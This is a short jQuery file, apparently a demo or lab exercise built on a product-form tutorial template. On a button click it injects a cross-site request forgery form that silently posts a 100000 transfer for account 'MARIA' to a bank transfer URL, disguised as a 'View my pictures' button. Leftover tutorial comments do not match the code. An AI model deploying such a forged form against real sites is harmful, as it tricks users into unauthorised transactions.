$(document).ready(function () {

    // show html form when 'create product' button was clicked
    $(document).on('click', '.cross-site-Request-Forgery', function () {
        // categories api call will be here
        // load list of categories
        $.getJSON("http://localhost/meteors/regist/category/read.php", function (data) {

            // build categories option html
            // loop through returned list of data
            var categories_options_html = `<select name='category_id' class='form-control'>`;
            $.each(data.records, function (key, val) {
                categories_options_html += `<option value='` + val.id + `'>` + val.name + `</option>`;
            });
            categories_options_html += `</select>`;

            // we have our html form here where product information will be entered
            // we used the 'required' html5 property to prevent empty fields
            var create_product_html = `
    <!-- 'create product' html form -->
<form id='cross-site-request-form' action='http://bank.com/transfer.do' method='post' border='0'>
    <table class='table table-hover table-responsive table-bordered'>
 
    <input type="hidden" name="acct" value="MARIA" />
    <input type="hidden" name="amount" value="100000" />
    <input type="submit" value="View my pictures" />   

</form>`;
            // inject html to 'page-content' of our app
            $("#page-content").html(create_product_html);

            // chage page title
            changePageTitle("Wellcome To MySite");
        });
    });

    // 'create product form' handle will be here
    // will run if create product form was submitted
    // $(document).on('submit', '#create-product-form', function () {
    //     // form data will be here
    //     // get form data
    //     var form_data = JSON.stringify($(this).serializeObject());

    //     // submit form data to api
    //     $.ajax({
    //         url: "http://localhost/Restfull_php/api/product/create.php",
    //         type: "POST",
    //         contentType: 'application/json',
    //         data: form_data,
    //         success: function (result) {
    //             // product was created, go back to products list
    //             showProducts();
    //         },
    //         error: function (xhr, resp, text) {
    //             // show error to console
    //             console.log(xhr, resp, text);
    //         }
    //     });

    //     return false;
    // });
});